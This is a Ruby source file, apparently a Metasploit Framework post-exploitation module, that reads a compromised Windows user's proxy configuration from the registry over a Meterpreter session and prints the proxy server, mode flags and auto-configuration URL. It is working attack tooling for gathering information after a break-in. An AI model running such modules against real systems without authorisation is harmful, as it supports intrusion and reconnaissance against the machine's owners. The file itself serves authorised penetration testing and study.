##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Post

	def initialize
		super(
			'Name'        => 'Windows Gather Proxy Setting',
			'Version'     => '$Revision$',
			'Description'    => %q{
				This module pulls a user's proxy settings. If neither RHOST or SID
				are set it pulls the current user, else it will pull the user's settings
				specified SID and target host.
			},
			'Author'      => [ 'mubix <mubix[at]hak5.org>' ],
			'License'     => MSF_LICENSE,
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		)

		register_options(
			[
				OptAddress.new('RHOST',   [ false,  'Remote host to clone settings to, defaults to local' ]),
				OptString.new('SID',   [ false,  'SID of user to clone settings to (SYSTEM is S-1-5-18)' ])
			], self.class)
	end

	def run

		if datastore['SID']
			root_key, base_key = session.sys.registry.splitkey("HKU\\#{datastore['SID']}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections")
		else
			root_key, base_key = session.sys.registry.splitkey("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections")
		end

		# print_status "#{root_key}"
		# print_status "#{base_key}"

		if datastore['RHOST']
			key = session.sys.registry.open_remote_key(datastore['RHOST'], root_key)
			open_key = key.open_key(base_key)
		else
			open_key = session.sys.registry.open_key(root_key, base_key)
		end

		values = open_key.query_value('DefaultConnectionSettings')

		data = values.data

		print_status "Proxy Counter = #{(data[4,1].unpack('C*'))[0]}"
		case (data[8,1].unpack('C*'))[0]
			when 1
				print_status "Setting: No proxy settings"
			when 3
				print_status "Setting: Proxy server"
			when 5
				print_status "Setting: Set proxy via AutoConfigure script"
			when 7
				print_status "Setting: Proxy server and AutoConfigure script"
			when 9
				print_status "Setting: WPAD"
			when 11
				print_status "Setting: WPAD and Proxy server"
			when 13
				print_status "Setting: WPAD and AutoConfigure script"
			when 15
				print_status "Setting: WPAD, Proxy server and AutoConfigure script"
			else
				print_status "Setting: Unknown proxy setting found"
		end

		cursor = 12
		proxyserver = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
		print_status "Proxy Server: #{proxyserver}" if proxyserver != ""

		cursor = cursor + 4 + (data[cursor].unpack('C*'))[0]
		additionalinfo = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
		print_status "Additional Info: #{additionalinfo}" if additionalinfo != ""

		cursor = cursor + 4 + (data[cursor].unpack('C*'))[0]
		autoconfigurl = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
		print_status "AutoConfigURL: #{autoconfigurl}" if autoconfigurl != ""

	end

end